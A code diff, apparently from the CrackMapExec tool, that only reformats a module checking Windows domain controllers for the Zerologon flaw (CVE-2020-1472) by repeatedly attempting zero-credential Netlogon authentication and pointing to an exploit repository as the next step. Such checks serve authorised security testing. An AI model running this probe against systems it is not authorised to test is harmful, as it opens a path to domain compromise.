@@ -14,9 +14,7 @@ MAX_ATTEMPTS = 2000  # False negative chance: 0.04%
 
 class CMEModule:
     name = "zerologon"
-    description = (
-        "Module to check if the DC is vulnerable to Zerologon aka CVE-2020-1472"
-    )
+    description = "Module to check if the DC is vulnerable to Zerologon aka CVE-2020-1472"
     supported_protocols = ["smb"]
     opsec_safe = True
     multiple_hosts = False
@@ -30,13 +28,9 @@ class CMEModule:
 
     def on_login(self, context, connection):
         self.context = context
-        if self.perform_attack(
-            "\\\\" + connection.hostname, connection.host, connection.hostname
-        ):
+        if self.perform_attack("\\\\" + connection.hostname, connection.host, connection.hostname):
             self.context.log.highlight("VULNERABLE")
-            self.context.log.highlight(
-                "Next step: https://github.com/dirkjanm/CVE-2020-1472"
-            )
+            self.context.log.highlight("Next step: https://github.com/dirkjanm/CVE-2020-1472")
             try:
                 host = self.context.db.get_hosts(connection.host)[0]
                 self.context.db.add_host(
@@ -61,18 +55,13 @@ class CMEModule:
             rpc_con.connect()
             rpc_con.bind(nrpc.MSRPC_UUID_NRPC)
             for attempt in range(0, MAX_ATTEMPTS):
-                result = try_zero_authenticate(
-                    rpc_con, dc_handle, dc_ip, target_computer
-                )
+                result = try_zero_authenticate(rpc_con, dc_handle, dc_ip, target_computer)
                 if result:
                     return True
             else:
                 self.context.log.debug("\nAttack failed. Target is probably patched.")
         except DCERPCException as e:
-            self.context.log.fail(
-                f"Error while connecting to host: DCERPCException, "
-                f"which means this is probably not a DC!"
-            )
+            self.context.log.fail(f"Error while connecting to host: DCERPCException, " f"which means this is probably not a DC!")
 
 
 def fail(msg):
@@ -95,9 +84,7 @@ def try_zero_authenticate(rpc_con, dc_handle, dc_ip, target_computer):
     flags = 0x212FFFFF
 
     # Send challenge and authentication request.
-    nrpc.hNetrServerReqChallenge(
-        rpc_con, dc_handle + "\x00", target_computer + "\x00", plaintext
-    )
+    nrpc.hNetrServerReqChallenge(rpc_con, dc_handle + "\x00", target_computer + "\x00", plaintext)
     try:
         server_auth = nrpc.hNetrServerAuthenticate3(
             rpc_con,
